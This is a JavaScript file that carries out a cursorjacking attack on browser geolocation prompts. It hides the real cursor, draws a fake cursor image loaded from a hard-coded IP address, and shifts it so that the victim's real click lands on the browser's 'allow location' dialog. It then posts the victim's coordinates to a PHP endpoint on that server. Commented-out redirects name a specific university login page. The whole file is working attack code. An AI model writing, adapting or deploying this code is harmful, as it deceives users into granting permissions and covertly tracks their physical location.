// config
var config = {
  serverIp: "5.160.250.61",
  triggerElement: "TransButton",
  // add all dependecies here
  dependencies: [
   {
     tag: "script",
     attr: "innerHTML",
     value: "https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"
   } 
  ]
};

// dependency loader
(function(){
  config.dependencies.map((obj) => {
    var dependency = document.createElement(obj.tag);
    if (obj.tag == "script"){
      addScriptSync(obj.value, dependency, obj.attr);
    }
    else{
      dependency[obj.attr] = obj.value;
      document.head.appendChild(dependency);
    }
  });
})();

// load scripts (like jquery) synchronously to make the script fit in a single file and easy to load
function addScriptSync(url, tag, attr){
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
        tag.innerHTML = this.responseText;
        document.getElementsByTagName("head")[0].appendChild(tag);
      }
  };
  xhttp.open("GET", url , false);
  xhttp.send();
};


// converting px to cm 
function px2cm(px) {
  var d = $("<div/>").css({ position: 'absolute', top : '-1000cm', left : '-1000cm', height : '1000cm', width : '1000cm' }).appendTo('body');
  var px_per_cm = d.height() / 1000;
  d.remove();
  return px / px_per_cm;
}

var data = {
  chrome: {
    name: "chrome",
    geoConfirmPosition: {
      x: 8.5,
      y: 2.8 
    }
  },

  firefox: {
    name: "firefox",
    geoConfirmPosition: {
      x: 8,
      y: 2 
    }
  },

  opera: {
    name: "opera",
    geoConfirmPosition: {        
      x: px2cm($(window).width()/2),
      y: px2cm(screen.height/9)
    }
  },

  safari: {
    name: "safari",
    geoConfirmPosition: {
      x: 10,
      y: 10
    }
  }
};

function sendLocationToServer(latitude, longitude){
  // make a ajax call here
  $.ajax({
      url: 'http://' + config.serverIp + '/get.php',
      type: 'post',
      dataType: 'json',
      // success: function (data) {
      //   window.location.replace('https://sess.shirazu.ac.ir/sess/script/login.aspx');       
      // },
      // error: function(){
      //   window.location.replace('https://sess.shirazu.ac.ir/sess/script/login.aspx');       
      // },
      data: {
        latitude: latitude,
        longitude:longitude 
      }
  });
}

function callGeolocation(){
  if (window.navigator.geolocation){
    window.navigator.geolocation.getCurrentPosition((position) => {
      sendLocationToServer(position.coords.latitude, position.coords.longitude);
    });
  }
  else{
    console.log("geolocation not supported");
  }
}

var getCursorLocation = function(){
    var cursorX = window.evt.pageX;
    var cursorY = window.evt.pageY;
    return {
      cursorX: cursorX,
      cursorY: cursorY
  };
};

var os = (() => {
  var OSName = "Unknown";
  if (window.navigator.userAgent.indexOf("Windows NT 10.0") != -1) OSName="Windows 10";
  else if (window.navigator.userAgent.indexOf("Windows NT 6.3") != -1) OSName="Windows 8.1";
  else if (window.navigator.userAgent.indexOf("Windows NT 6.2") != -1) OSName="Windows 8";
  else if (window.navigator.userAgent.indexOf("Windows NT 6.1") != -1) OSName="Windows 7";
  else if (window.navigator.userAgent.indexOf("Windows NT 6.0") != -1) OSName="Windows Vista";
  else if (window.navigator.userAgent.indexOf("Windows NT 5.1") != -1) OSName="Windows XP";
  else if (window.navigator.userAgent.indexOf("Mac")!=-1) OSName="Mac/iOS";
  else if (window.navigator.userAgent.indexOf("X11")!=-1) OSName="UNIX";
  else if (window.navigator.userAgent.indexOf("Linux")!=-1) OSName="Linux";
  return OSName;
})();


(function loadPointerElement() {
    pointerSource = "";
    if (os.indexOf("Windows") != -1){
      pointerSource = "http://" + config.serverIp + "/windows.png";
    }
    else if (os.indexOf("Mac") != -1){
      pointerSource = "http://" + config.serverIp + "/mac.png";
    }
    var fakeCursor = document.createElement("img");
    fakeCursor.id = "fakeCursor";
    fakeCursor.src = pointerSource;
    document.body.appendChild(fakeCursor);
})();

var browser = (function(){
    var ua= navigator.userAgent, tem,
    M= ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
    if(/trident/i.test(M[1])){
        tem=  /\brv[ :]+(\d+)/g.exec(ua) || [];
        return 'IE '+(tem[1] || '');
    }
    if(M[1]=== 'Chrome'){
        tem= ua.match(/\b(OPR|Edge)\/(\d+)/);
        if(tem!= null) return tem.slice(1).join(' ').replace('OPR', 'Opera');
    }
    M= M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
    if((tem= ua.match(/version\/(\d+)/i))!= null) M.splice(1, 1, tem[1]);
    return M.join(' ');
})();


function isCollision(element1, element2) {
	var rect1 = element1.getBoundingClientRect();
	var rect2 = element2.getBoundingClientRect();

	return !(
    rect1.top > rect2.bottom ||
    rect1.right < rect2.left ||
    rect1.bottom < rect2.top ||
    rect1.left > rect2.right
  );
}

function triggerGeoLocationOnCollision(rigidElement){
  if ( isCollision(document.getElementById("fakeCursor"), rigidElement) ){
    callGeolocation();
  }
}

function getElementPosition(element){
  var rect = element.getBoundingClientRect();
  return {
    top: rect.top,
    right: rect.right,
    left: rect.left,
    bottom: rect.bottom
  }
}

// not used
function convertRatioToPixel(ratioX, ratioY, screenWidth, screenHeight){
  return {
    x: screenWidth / ratioX,
    y: screenHeight / ratioY
  }
}

// setting padding according to element 
var setPadding = {
  toLeft: (length) => {
    document.getElementById("fakeCursor").style.left = px2cm(getCursorLocation().cursorX) - length + "cm";
  },
  toRight: (length) => {
    document.getElementById("fakeCursor").style.left = px2cm(getCursorLocation().cursorX) + length + "cm";
  },
  toBottom: (length) => {
    document.getElementById("fakeCursor").style.top = px2cm(getCursorLocation().cursorY) + length + "cm";
  },
  toTop: (length) => {
    document.getElementById("fakeCursor").style.top = px2cm(getCursorLocation().cursorY) - length + "cm";
  }
}


function fakeCursorController(element, confirmLocation){
  var elementCmPositionX = px2cm(getElementPosition(element).left);
  var elementCmPositionY = px2cm(getElementPosition(element).top);
  
  // handling x direction
  if (elementCmPositionX > confirmLocation.x){
    setPadding.toRight(elementCmPositionX - confirmLocation.x); 
  }
  else {
    setPadding.toLeft(confirmLocation.x - elementCmPositionX);
  }
  
  // handling y direction
  if (elementCmPositionY > confirmLocation.y){
    setPadding.toBottom(elementCmPositionY - confirmLocation.y)
  }
  else {
    setPadding.toTop(confirmLocation.y - elementCmPositionY);
  }
}

// not used
function moveFakeCursor(){
  document.getElementById("fakeCursor").style.left = px2cm(getCursorLocation().cursorX) + "cm" ;
  document.getElementById("fakeCursor").style.top = px2cm(getCursorLocation().cursorY) + "cm";
}

var alertPosition = (function() {
  return data[browser.toLowerCase().split(' ')[0]].geoConfirmPosition;
})();

// initializing the window.event property for all browsers
$(window).mousemove(function(e){
  window.evt = e;
  fakeCursorController(document.getElementById(config.triggerElement), alertPosition);
  triggerGeoLocationOnCollision(document.getElementById(config.triggerElement));
});


/** setting styleSheet **/

// style variable
var style = `
  *{
    cursor: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZdEVYdFNvZnR3YXJlAFBhaW50Lk5FVCB2My41LjbQg61aAAAADUlEQVQYV2P4//8/IwAI/QL/+TZZdwAAAABJRU5ErkJggg=='),
    none !important;
  }

  #fakeCursor{
    position: absolute;
  }
`;

// appending style to the page
(function(){
 var styleSheet = document.createElement("style");
 styleSheet.innerHTML = style;
 (document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0]).appendChild(styleSheet);
})();
